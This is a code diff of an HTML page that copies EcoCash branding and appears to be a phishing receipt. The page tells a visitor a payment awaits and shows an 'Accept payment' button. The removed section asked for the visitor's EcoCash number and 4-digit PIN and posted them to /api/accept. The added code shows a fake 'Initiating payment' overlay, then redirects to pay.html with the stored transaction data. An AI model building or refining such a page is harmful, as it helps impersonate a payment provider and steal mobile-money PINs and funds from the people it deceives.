@@ -33,21 +33,12 @@
     padding: 0 0 40px;
   }
 
-  /* ===== Header ===== */
-  .header {
-    background: var(--eco-white);
-    border-bottom: 1px solid var(--eco-border);
-    padding: 0 16px;
-  }
-  .header-inner {
-    max-width: 480px; margin: 0 auto;
-    height: 60px; display: flex; align-items: center; justify-content: space-between;
-  }
+  .header { background: var(--eco-white); border-bottom: 1px solid var(--eco-border); padding: 0 16px; }
+  .header-inner { max-width: 480px; margin: 0 auto; height: 60px; display: flex; align-items: center; justify-content: space-between; }
 
   .logo {
     display: inline-flex; align-items: baseline; gap: 0;
-    font-weight: 800; font-size: 22px; letter-spacing: -0.6px;
-    line-height: 1; user-select: none;
+    font-weight: 800; font-size: 22px; letter-spacing: -0.6px; line-height: 1; user-select: none;
   }
   .logo .eco { color: var(--eco-blue); }
   .logo .cash { color: var(--eco-red); }
@@ -69,38 +60,26 @@
 
   .wrap { max-width: 480px; margin: 0 auto; padding: 20px 16px 0; }
 
-  .actions {
-    display: grid; grid-template-columns: 1fr 1fr; gap: 10px;
-    margin-bottom: 16px;
-  }
+  .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 16px; }
   .btn {
     display: inline-flex; align-items: center; justify-content: center; gap: 8px;
     padding: 12px; border-radius: 10px;
     font-size: 13px; font-weight: 600; font-family: inherit;
     cursor: pointer; transition: all .15s; border: 1.5px solid transparent;
   }
-  .btn-outline {
-    background: var(--eco-white); color: var(--eco-blue);
-    border-color: #CBD5E1;
-  }
+  .btn-outline { background: var(--eco-white); color: var(--eco-blue); border-color: #CBD5E1; }
   .btn-outline:hover { border-color: var(--eco-blue); background: #F0F6FC; }
   .btn-outline.copied { background: var(--eco-green); border-color: var(--eco-green); color: #fff; }
   .btn-primary { background: var(--eco-blue); color: #fff; border-color: var(--eco-blue); }
   .btn-primary:hover { filter: brightness(1.08); }
 
-  /* ===== Card ===== */
   .card {
-    background: var(--eco-white);
-    border: 1px solid var(--eco-border);
-    border-radius: var(--radius-card);
-    box-shadow: var(--shadow-card);
-    overflow: hidden;
+    background: var(--eco-white); border: 1px solid var(--eco-border);
+    border-radius: var(--radius-card); box-shadow: var(--shadow-card); overflow: hidden;
   }
   .card-top {
     display: flex; align-items: center; justify-content: space-between;
-    padding: 16px 20px;
-    border-bottom: 1px solid var(--eco-border);
-    background: #FBFCFE;
+    padding: 16px 20px; border-bottom: 1px solid var(--eco-border); background: #FBFCFE;
   }
   .icon-btn {
     width: 34px; height: 34px; border-radius: 9px;
@@ -112,10 +91,7 @@
   .icon-btn:hover { color: var(--eco-blue); border-color: var(--eco-blue); }
   .card-title { font-size: 14.5px; font-weight: 700; letter-spacing: -0.2px; color: var(--eco-navy); }
 
-  /* ===== Status ===== */
   .status { text-align: center; padding: 28px 24px 18px; }
-
-  /* Tick — EcoCash blue by default (pending) */
   .tick {
     width: 76px; height: 76px; border-radius: 50%;
     background: var(--eco-blue); color: #fff;
@@ -125,65 +101,36 @@
     position: relative;
   }
   .tick svg { width: 34px; height: 34px; display: block; }
-  .tick svg path {
-    stroke: #fff; stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round;
-    fill: none;
-  }
-  /* Success uses green */
-  .tick.success {
-    background: var(--eco-green);
-    box-shadow: 0 0 0 6px rgba(34,163,86,0.12), 0 10px 22px rgba(34,163,86,0.28);
-  }
-  /* Failed */
-  .tick.failed {
-    background: var(--eco-red);
-    box-shadow: 0 0 0 6px rgba(227,27,35,0.12), 0 10px 22px rgba(227,27,35,0.28);
-  }
-  /* Expired */
-  .tick.expired {
-    background: #94A3B8;
-    box-shadow: 0 0 0 6px rgba(148,163,184,0.12), 0 10px 22px rgba(148,163,184,0.28);
-  }
+  .tick svg path { stroke: #fff; stroke-width: 3.2; stroke-linecap: round; stroke-linejoin: round; fill: none; }
+  .tick.success { background: var(--eco-green); box-shadow: 0 0 0 6px rgba(34,163,86,0.12), 0 10px 22px rgba(34,163,86,0.28); }
+  .tick.failed { background: var(--eco-red); box-shadow: 0 0 0 6px rgba(227,27,35,0.12), 0 10px 22px rgba(227,27,35,0.28); }
+  .tick.expired { background: #94A3B8; box-shadow: 0 0 0 6px rgba(148,163,184,0.12), 0 10px 22px rgba(148,163,184,0.28); }
 
   .status-title { font-size: 19px; font-weight: 800; letter-spacing: -0.4px; line-height: 1.3; margin-bottom: 6px; }
   .status-desc { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
   .status-date { font-size: 12px; color: var(--eco-muted); margin-top: 10px; font-weight: 500; }
 
-  /* ===== Amount ===== */
   .amount-panel {
-    margin: 0 20px 20px;
-    padding: 16px 18px;
-    border: 1.5px solid var(--eco-border);
-    border-radius: 14px;
+    margin: 0 20px 20px; padding: 16px 18px;
+    border: 1.5px solid var(--eco-border); border-radius: 14px;
     background: #FBFCFE;
     display: flex; align-items: center; justify-content: space-between; gap: 14px;
   }
   .amount-left { min-width: 0; }
-  .amount-label {
-    font-size: 11.5px; font-weight: 600; color: var(--eco-muted);
-    text-transform: uppercase; letter-spacing: 0.7px; margin-bottom: 5px;
-  }
-  .amount-value {
-    font-size: 26px; font-weight: 800; letter-spacing: -1px;
-    color: var(--eco-navy); line-height: 1.1; white-space: nowrap;
-  }
+  .amount-label { font-size: 11.5px; font-weight: 600; color: var(--eco-muted); text-transform: uppercase; letter-spacing: 0.7px; margin-bottom: 5px; }
+  .amount-value { font-size: 26px; font-weight: 800; letter-spacing: -1px; color: var(--eco-navy); line-height: 1.1; white-space: nowrap; }
   .amount-value .cur { font-size: 14px; font-weight: 700; color: var(--eco-blue); margin-right: 6px; }
   .btn-accept {
-    flex-shrink: 0;
-    padding: 12px 20px;
+    flex-shrink: 0; padding: 12px 20px;
     font-size: 13.5px; font-weight: 700;
-    background: var(--eco-green); color: #fff;
-    border: none; border-radius: 10px;
+    background: var(--eco-green); color: #fff; border: none; border-radius: 10px;
     cursor: pointer; font-family: inherit;
-    transition: filter .15s, transform .1s;
-    white-space: nowrap;
+    transition: filter .15s, transform .1s; white-space: nowrap;
   }
   .btn-accept:hover { filter: brightness(1.07); }
   .btn-accept:active { transform: scale(0.98); }
-  .btn-accept:disabled { opacity: 0.7; cursor: wait; }
   .btn-accept.accepted { background: var(--eco-blue); pointer-events: none; }
 
-  /* ===== Parties ===== */
   .parties { padding: 0 20px 6px; }
   .party { display: flex; align-items: center; gap: 12px; padding: 14px 0; }
   .party + .party { border-top: 1px solid var(--eco-border); }
@@ -194,25 +141,12 @@
     font-size: 14px; font-weight: 700; letter-spacing: 0.3px; flex-shrink: 0;
   }
   .party-body { flex: 1; min-width: 0; }
-  .party-label {
-    font-size: 11px; font-weight: 600; color: var(--eco-muted);
-    text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 1px;
-  }
+  .party-label { font-size: 11px; font-weight: 600; color: var(--eco-muted); text-transform: uppercase; letter-spacing: 0.6px; margin-bottom: 1px; }
   .party-name { font-size: 14px; font-weight: 700; word-break: break-word; }
   .party-meta { font-size: 12px; color: var(--eco-muted); margin-top: 1px; }
 
-  /* ===== Details ===== */
-  .details {
-    margin: 6px 20px 22px;
-    background: var(--eco-soft);
-    border-radius: 12px;
-    padding: 4px 16px;
-  }
-  .row {
-    display: flex; justify-content: space-between; align-items: flex-start;
-    gap: 14px; padding: 11px 0;
-    border-bottom: 1px solid #EDF0F4;
-  }
+  .details { margin: 6px 20px 22px; background: var(--eco-soft); border-radius: 12px; padding: 4px 16px; }
+  .row { display: flex; justify-content: space-between; align-items: flex-start; gap: 14px; padding: 11px 0; border-bottom: 1px solid #EDF0F4; }
   .row:last-child { border-bottom: none; }
   .row .k { font-size: 12px; color: var(--eco-muted); flex-shrink: 0; }
   .row .v { font-size: 12.5px; font-weight: 600; text-align: right; word-break: break-word; color: var(--eco-navy); }
@@ -227,138 +161,67 @@
   .row .v.failed { color: var(--eco-red); }
   .row .v.expired { color: var(--eco-muted); }
 
-  /* ===== Footer ===== */
-  .card-foot {
-    padding: 16px 20px 22px;
-    border-top: 1px solid var(--eco-border);
-    background: #FBFCFE;
-    display: flex; align-items: center; justify-content: center;
-  }
+  .card-foot { padding: 16px 20px 22px; border-top: 1px solid var(--eco-border); background: #FBFCFE; display: flex; align-items: center; justify-content: center; }
   .card-foot .logo { font-size: 18px; }
-
   .page-foot { text-align: center; margin-top: 18px; font-size: 11px; color: var(--eco-muted); line-height: 1.6; }
-
   .error-box { text-align: center; padding: 40px 24px; }
   .error-box h2 { font-size: 18px; margin-bottom: 8px; }
   .error-box p { font-size: 13px; color: var(--eco-muted); }
 
-  /* ============================================================
-     Payment step (overlay inside the card)
-  ============================================================ */
-  .pay-step {
-    display: none;
-    padding: 22px 20px 24px;
-    border-top: 1px solid var(--eco-border);
-    background: #FBFCFE;
-  }
-  .pay-step.show { display: block; animation: fadeIn .25s ease; }
-  @keyframes fadeIn { from { opacity: 0; transform: translateY(-4px); } to { opacity: 1; transform: none; } }
-
-  .pay-step h3 {
-    font-size: 15px; font-weight: 800; letter-spacing: -0.3px;
-    margin-bottom: 4px;
-  }
-  .pay-step .pay-sub {
-    font-size: 12px; color: var(--eco-muted); margin-bottom: 16px; line-height: 1.5;
-  }
-
-  .pay-field { margin-bottom: 14px; }
-  .pay-field label {
-    display: block; font-size: 12px; font-weight: 600;
-    color: var(--eco-navy); margin-bottom: 6px;
-  }
-
-  .phone-row {
-    display: flex; gap: 8px;
-  }
-  .phone-row select {
-    flex: 0 0 110px;
-    padding: 11px 10px;
-    border: 1.5px solid var(--eco-border); border-radius: 9px;
-    background: #fff; color: var(--eco-navy);
-    font-size: 13px; font-family: inherit; outline: none;
-    transition: border-color .15s, box-shadow .15s;
-  }
-  .phone-row input {
-    flex: 1; min-width: 0;
-    padding: 11px 13px;
-    border: 1.5px solid var(--eco-border); border-radius: 9px;
-    background: #fff; color: var(--eco-navy);
-    font-size: 14px; font-family: inherit; outline: none;
-    transition: border-color .15s, box-shadow .15s;
-    letter-spacing: 0.5px;
-  }
-  .phone-row select:focus, .phone-row input:focus {
-    border-color: var(--eco-blue);
-    box-shadow: 0 0 0 3px rgba(0,92,169,0.12);
-  }
-
-  /* PIN boxes */
-  .pin-row { display: flex; gap: 10px; }
-  .pin-row input {
-    flex: 1; min-width: 0;
-    height: 52px;
-    text-align: center;
-    font-size: 20px; font-weight: 700;
-    border: 1.5px solid var(--eco-border); border-radius: 10px;
-    background: #fff; color: var(--eco-navy); outline: none;
-    font-family: inherit;
-    transition: border-color .15s, box-shadow .15s;
-    -webkit-text-security: disc;
-  }
-  .pin-row input:focus {
-    border-color: var(--eco-blue);
-    box-shadow: 0 0 0 3px rgba(0,92,169,0.12);
-  }
-
-  .pay-error {
-    display: none;
-    font-size: 12px; color: var(--eco-red); font-weight: 500;
-    margin-top: 8px;
-  }
-  .pay-error.show { display: block; }
-
-  .pay-actions {
-    display: flex; gap: 8px; margin-top: 16px;
-  }
-  .btn-cancel {
-    flex: 0 0 110px;
-    padding: 12px;
-    background: #fff; color: var(--eco-navy);
-    border: 1.5px solid var(--eco-border); border-radius: 10px;
-    font-size: 13px; font-weight: 600; font-family: inherit;
-    cursor: pointer; transition: all .15s;
-  }
-  .btn-cancel:hover { border-color: var(--eco-navy); }
-  .btn-submit {
-    flex: 1;
-    padding: 12px;
-    background: var(--eco-green); color: #fff;
-    border: none; border-radius: 10px;
-    font-size: 13.5px; font-weight: 700; font-family: inherit;
-    cursor: pointer; transition: filter .15s, transform .1s;
-  }
-  .btn-submit:hover { filter: brightness(1.07); }
-  .btn-submit:active { transform: scale(0.99); }
-  .btn-submit:disabled { opacity: 0.7; cursor: wait; }
-
-  /* Toast */
   .toast {
-    position: fixed; bottom: 24px; left: 50%;
-    transform: translateX(-50%) translateY(80px);
-    background: var(--eco-navy); color: #fff;
-    padding: 11px 18px; border-radius: 9px;
-    font-size: 12.5px; font-weight: 600;
-    box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    position: fixed; bottom: 24px; left: 50%; transform: translateX(-50%) translateY(80px);
+    background: var(--eco-navy); color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; box-shadow: 0 10px 30px rgba(0,0,0,0.2);
     opacity: 0; transition: all .3s ease; z-index: 100; pointer-events: none;
     max-width: 90%; text-align: center;
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
+  /* ===== Initiating overlay (full page) ===== */
+  .initiating {
+    position: fixed; inset: 0;
+    background: #FFFFFF;
+    display: none; align-items: center; justify-content: center;
+    z-index: 200;
+  }
+  .initiating.show { display: flex; }
+  .initiating .inner {
+    text-align: center; max-width: 320px; padding: 0 24px;
+  }
+  .initiating .logo-big {
+    display: inline-flex; align-items: baseline;
+    font-weight: 800; font-size: 30px; letter-spacing: -1px; margin-bottom: 32px;
+  }
+  .initiating .logo-big .eco { color: var(--eco-blue); }
+  .initiating .logo-big .cash { color: var(--eco-red); }
+
+  .spinner {
+    width: 54px; height: 54px; margin: 0 auto 22px;
+    border: 4px solid #E5E7EB;
+    border-top-color: var(--eco-blue);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .initiating .title { font-size: 16px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 6px; }
+  .initiating .sub { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
+  .initiating .dots { display: inline-block; }
+  .initiating .dots::after {
+    content: '';
+    animation: dots 1.4s steps(4, end) infinite;
+  }
+  @keyframes dots {
+    0% { content: ''; }
+    25% { content: '.'; }
+    50% { content: '..'; }
+    75% { content: '...'; }
+  }
+
   @media print {
     body { background: #fff; padding: 0; }
     .header, .actions, .btn-accept, .page-foot, .toast,
-    .card-top .icon-btn, .pay-step { display: none !important; }
+    .card-top .icon-btn, .initiating { display: none !important; }
     .wrap { max-width: 100%; padding: 0; }
     .card { box-shadow: none; border: 1px solid #ccc; }
     .card-top, .card-foot { background: #fff; }
@@ -371,7 +234,6 @@
     .status-title { font-size: 17px; }
     .card-top, .status, .amount-panel, .parties, .details, .card-foot { padding-left: 16px; padding-right: 16px; }
     .amount-panel, .details { margin-left: 16px; margin-right: 16px; }
-    .phone-row select { flex-basis: 96px; font-size: 12px; }
   }
 </style>
 </head>
@@ -385,7 +247,6 @@
 </header>
 
 <div class="wrap">
-
   <div class="actions">
     <button class="btn btn-outline" id="copyBtn" onclick="copyReceipt()">
       <span>📋</span> <span id="copyLbl">Copy Receipt</span>
@@ -396,7 +257,6 @@
   </div>
 
   <div class="card" id="receipt">
-
     <div class="card-top">
       <button class="icon-btn" onclick="shareReceipt()" title="Share receipt">↗</button>
       <div class="card-title">Payment Receipt</div>
@@ -405,9 +265,7 @@
 
     <div class="status">
       <div class="tick" id="tick">
-        <svg viewBox="0 0 24 24" aria-hidden="true">
-          <path d="M5 12.5l4.2 4.2L19 7"/>
-        </svg>
+        <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5 12.5l4.2 4.2L19 7"/></svg>
       </div>
       <div class="status-title" id="statusTitle">Payment Request Received</div>
       <div class="status-desc" id="statusDesc">Please review the details below and confirm the payment.</div>
@@ -419,7 +277,7 @@
         <div class="amount-label">Amount to pay</div>
         <div class="amount-value"><span class="cur" id="amtCur">USD</span><span id="amtVal">0.00</span></div>
       </div>
-      <button class="btn-accept" id="acceptBtn" onclick="openPayStep()">Accept payment</button>
+      <button class="btn-accept" id="acceptBtn" onclick="startAccept()">Accept payment</button>
     </div>
 
     <div class="parties">
@@ -443,36 +301,6 @@
 
     <div class="details" id="details"></div>
 
-    <!-- Payment step -->
-    <div class="pay-step" id="payStep">
-      <h3>Confirm with EcoCash</h3>
-      <p class="pay-sub">Enter the EcoCash number and 4-digit PIN to authorise this payment.</p>
-
-      <div class="pay-field">
-        <label for="payPhone">EcoCash number</label>
-        <div class="phone-row">
-          <select id="payCountry" aria-label="Country code"></select>
-          <input type="tel" id="payPhone" inputmode="numeric" autocomplete="tel" placeholder="Phone number" maxlength="15">
-        </div>
-      </div>
-
-      <div class="pay-field">
-        <label for="pin1">4-digit PIN</label>
-        <div class="pin-row">
-          <input type="password" id="pin1" inputmode="numeric" maxlength="1" autocomplete="one-time-code" aria-label="PIN digit 1">
-          <input type="password" id="pin2" inputmode="numeric" maxlength="1" aria-label="PIN digit 2">
-          <input type="password" id="pin3" inputmode="numeric" maxlength="1" aria-label="PIN digit 3">
-          <input type="password" id="pin4" inputmode="numeric" maxlength="1" aria-label="PIN digit 4">
-        </div>
-        <div class="pay-error" id="payError"></div>
-      </div>
-
-      <div class="pay-actions">
-        <button class="btn-cancel" onclick="closePayStep()" type="button">Cancel</button>
-        <button class="btn-submit" id="paySubmit" onclick="submitPayment()" type="button">Pay now</button>
-      </div>
-    </div>
-
     <div class="card-foot">
       <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
     </div>
@@ -484,48 +312,24 @@
   </div>
 </div>
 
+<!-- Full-page initiating overlay -->
+<div class="initiating" id="initiating">
+  <div class="inner">
+    <div class="logo-big"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <div class="spinner"></div>
+    <div class="title">Initiating payment<span class="dots"></span></div>
+    <div class="sub">Please wait while we prepare your secure payment session.</div>
+  </div>
+</div>
+
 <div class="toast" id="toast"></div>
 
 <script>
 /* ============================================================
-   Country codes — initial selection comes from transaction.c
-============================================================ */
-const COUNTRY_CODES = {
-  'Zimbabwe': '+263',
-  'South Africa': '+27',
-  'Zambia': '+260',
-  'Botswana': '+267',
-  'Kenya': '+254',
-  'Malawi': '+265',
-  'Rwanda': '+250',
-  'DR Congo': '+243',
-  'Ghana': '+233',
-  'Lesotho': '+266',
-  'Uganda': '+256',
-  'China (Alipay)': '+86'
-};
-
-function fillCountrySelect(selectedCountry) {
-  const sel = document.getElementById('payCountry');
-  sel.innerHTML = '';
-  const entries = Object.entries(COUNTRY_CODES);
-  entries.forEach(([name, code]) => {
-    const opt = document.createElement('option');
-    opt.value = code;
-    opt.textContent = code + '  ' + name;
-    if (selectedCountry && name === selectedCountry) opt.selected = true;
-    sel.appendChild(opt);
-  });
-  // Fallback to +263 if nothing matched
-  if (!sel.value) sel.value = '+263';
-}
-
-/* ============================================================
-   Data decoding — unchanged contract
+   Data decoding
 ============================================================ */
 async function decodeData() {
   const params = new URLSearchParams(window.location.search);
-
   const code = params.get('r');
   if (code) {
     try {
@@ -534,7 +338,6 @@ async function decodeData() {
       return await res.json();
     } catch (e) { return null; }
   }
-
   const raw = params.get('d');
   if (!raw) return null;
   try {
@@ -578,9 +381,6 @@ function showToast(msg) {
   t._timer = setTimeout(() => t.classList.remove('show'), 2200);
 }
 
-/* ============================================================
-   Status config — pending uses EcoCash blue tick
-============================================================ */
 const STATUS = {
   pending: { title: 'Payment Request Received', desc: 'Please review the details below and confirm the payment.', cls: '' },
   success: { title: 'Payment Completed Successfully', desc: 'The payment has been confirmed by the payment provider.', cls: 'success' },
@@ -599,15 +399,8 @@ async function render() {
 
   if (!data) {
     card.innerHTML = `
-      <div class="card-top">
-        <div></div>
-        <div class="card-title">Payment Receipt</div>
-        <div></div>
-      </div>
-      <div class="error-box">
-        <h2>Invalid or missing link</h2>
-        <p>Please request a new payment link from the merchant.</p>
-      </div>`;
+      <div class="card-top"><div></div><div class="card-title">Payment Receipt</div><div></div></div>
+      <div class="error-box"><h2>Invalid or missing link</h2><p>Please request a new payment link from the merchant.</p></div>`;
     document.querySelector('.actions').style.display = 'none';
     return;
   }
@@ -620,10 +413,7 @@ async function render() {
   data._statusKey = statusKey;
 
   const cfg = STATUS[statusKey];
-
-  const tick = document.getElementById('tick');
-  tick.className = 'tick ' + cfg.cls;
-
+  document.getElementById('tick').className = 'tick ' + cfg.cls;
   document.getElementById('statusTitle').textContent = cfg.title;
   document.getElementById('statusDesc').textContent = cfg.desc;
   document.getElementById('statusDate').textContent =
@@ -637,26 +427,22 @@ async function render() {
     acceptBtn.style.display = 'inline-flex';
     acceptBtn.textContent = 'Accept payment';
     acceptBtn.classList.remove('accepted');
-    acceptBtn.disabled = false;
   } else {
     acceptBtn.style.display = 'none';
   }
 
-  // Customer
   const custName = data.rn || 'Recipient';
   const custMeta = data.recipientPhone || data.an || '';
   document.getElementById('custAvatar').textContent = initials(custName);
   document.getElementById('custName').textContent = custName;
   document.getElementById('custMeta').textContent = maskPhone(custMeta) || 'EcoCash wallet';
 
-  // Sender
   const fromName = data.senderName || 'EcoCash Merchant';
   const fromMeta = data.senderPhone || 'Business account';
   document.getElementById('fromAvatar').textContent = initials(fromName);
   document.getElementById('fromName').textContent = fromName;
   document.getElementById('fromMeta').textContent = maskPhone(fromMeta) || 'EcoCash account';
 
-  // Details
   const rows = [
     { k: 'Country', v: data.c },
     { k: 'Transaction ID', v: data.tx, mono: true },
@@ -670,135 +456,31 @@ async function render() {
   let html = '';
   rows.forEach(r => {
     if (!r.v && r.v !== 0) return;
-    let vcls = '';
-    if (r.mono) vcls = 'mono';
-    else if (r.cls) vcls = r.cls;
+    let vcls = r.mono ? 'mono' : (r.cls || '');
     html += `<div class="row"><span class="k">${escapeHtml(r.k)}</span><span class="v ${vcls}">${escapeHtml(r.v)}</span></div>`;
   });
   document.getElementById('details').innerHTML = html;
-
-  // Prefill country code from transaction
-  fillCountrySelect(data.c);
 
   document.title = cfg.title + ' · EcoCash';
 }
 
 /* ============================================================
-   Payment step — open / close
+   Accept -> full-page initiating overlay -> pay.html
 ============================================================ */
-function openPayStep() {
+function startAccept() {
   if (!receiptData) return;
-  // Prefill phone if transaction contains one
-  const phoneInput = document.getElementById('payPhone');
-  const rawPhone = (receiptData.recipientPhone || receiptData.an || '').replace(/\D/g, '');
-  if (rawPhone) phoneInput.value = rawPhone.replace(/^0+/, '');
+  const overlay = document.getElementById('initiating');
+  overlay.classList.add('show');
 
-  document.getElementById('payStep').classList.add('show');
-  document.getElementById('payError').classList.remove('show');
-  document.getElementById('payPhone').focus();
-}
-
-function closePayStep() {
-  document.getElementById('payStep').classList.remove('show');
-}
-
-/* PIN boxes — auto-advance and backspace */
-document.addEventListener('DOMContentLoaded', () => {
-  const pins = ['pin1','pin2','pin3','pin4'].map(id => document.getElementById(id));
-  pins.forEach((el, i) => {
-    el.addEventListener('input', () => {
-      el.value = el.value.replace(/\D/g, '').slice(0, 1);
-      if (el.value && i < pins.length - 1) pins[i + 1].focus();
-    });
-    el.addEventListener('keydown', (e) => {
-      if (e.key === 'Backspace' && !el.value && i > 0) {
-        pins[i - 1].focus();
-      }
-    });
-    // Paste handler — distribute digits across boxes
-    el.addEventListener('paste', (e) => {
-      const paste = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
-      if (paste.length === 4) {
-        e.preventDefault();
-        paste.split('').forEach((d, idx) => { pins[idx].value = d; });
-        pins[3].focus();
-      }
-    });
-  });
-});
-
-/* ============================================================
-   Submit payment — real backend call
-============================================================ */
-async function submitPayment() {
-  if (!receiptData) return;
-
-  const errorEl = document.getElementById('payError');
-  errorEl.classList.remove('show');
-
-  const countryCode = document.getElementById('payCountry').value;
-  const phoneDigits = document.getElementById('payPhone').value.replace(/\D/g, '');
-  const pin = ['pin1','pin2','pin3','pin4'].map(id => document.getElementById(id).value).join('');
-
-  if (phoneDigits.length < 6) {
-    errorEl.textContent = 'Please enter a valid phone number.';
-    errorEl.classList.add('show');
-    return;
-  }
-  if (pin.length !== 4) {
-    errorEl.textContent = 'Please enter all 4 PIN digits.';
-    errorEl.classList.add('show');
-    return;
-  }
-
-  const btn = document.getElementById('paySubmit');
-  btn.disabled = true;
-  btn.textContent = 'Processing…';
-
+  // Persist transaction info so pay.html can read it
   try {
-    const res = await fetch('/api/accept', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        transactionId: receiptData.tx,
-        phone: countryCode + phoneDigits,
-        pin: pin
-      })
-    });
-    if (!res.ok) throw new Error('Server responded ' + res.status);
-    const result = await res.json();
+    sessionStorage.setItem('ecopay_current', JSON.stringify(receiptData));
+  } catch (e) {}
 
-    if (result.status === 'success') {
-      closePayStep();
-      document.getElementById('statusTitle').textContent = 'Payment Completed Successfully';
-      document.getElementById('statusDesc').textContent = 'The payment has been confirmed by the payment provider.';
-      document.getElementById('tick').className = 'tick success';
-      const statusRow = document.querySelector('.row .v.pending, .row .v.success');
-      if (statusRow) { statusRow.textContent = 'Payment Completed Successfully'; statusRow.classList.remove('pending'); statusRow.classList.add('success'); }
-      document.getElementById('acceptBtn').style.display = 'none';
-      showToast('Payment confirmed.');
-    } else if (result.status === 'failed') {
-      errorEl.textContent = result.message || 'Payment failed. Please check your number and PIN.';
-      errorEl.classList.add('show');
-      btn.disabled = false;
-      btn.textContent = 'Pay now';
-    } else {
-      closePayStep();
-      document.getElementById('statusTitle').textContent = 'Awaiting Provider Confirmation';
-      document.getElementById('statusDesc').textContent =
-        'Your payment has been submitted. The receipt will update once the provider confirms.';
-      document.getElementById('acceptBtn').textContent = 'Submitted';
-      document.getElementById('acceptBtn').classList.add('accepted');
-      showToast('Payment submitted. Awaiting provider confirmation.');
-      btn.disabled = false;
-      btn.textContent = 'Pay now';
-    }
-  } catch (err) {
-    errorEl.textContent = 'Could not process payment. Please try again.';
-    errorEl.classList.add('show');
-    btn.disabled = false;
-    btn.textContent = 'Pay now';
-  }
+  // 3 seconds, then navigate
+  setTimeout(() => {
+    window.location.href = 'pay.html';
+  }, 3000);
 }
 
 /* ============================================================
@@ -831,10 +513,7 @@ function copyReceipt() {
     btn.classList.add('copied');
     lbl.textContent = 'Copied ✓';
     showToast('Receipt copied to clipboard.');
-    setTimeout(() => {
-      btn.classList.remove('copied');
-      lbl.textContent = 'Copy Receipt';
-    }, 1800);
+    setTimeout(() => { btn.classList.remove('copied'); lbl.textContent = 'Copy Receipt'; }, 1800);
   };
   if (navigator.clipboard && navigator.clipboard.writeText) {
     navigator.clipboard.writeText(lines).then(done).catch(() => { fallbackCopy(lines); done(); });
@@ -865,9 +544,7 @@ function shareReceipt() {
   }
 }
 
-function openHelp() {
-  window.open('https://ecocash.co.zw/', '_blank');
-}
+function openHelp() { window.open('https://ecocash.co.zw/', '_blank'); }
 
 render();
 </script>
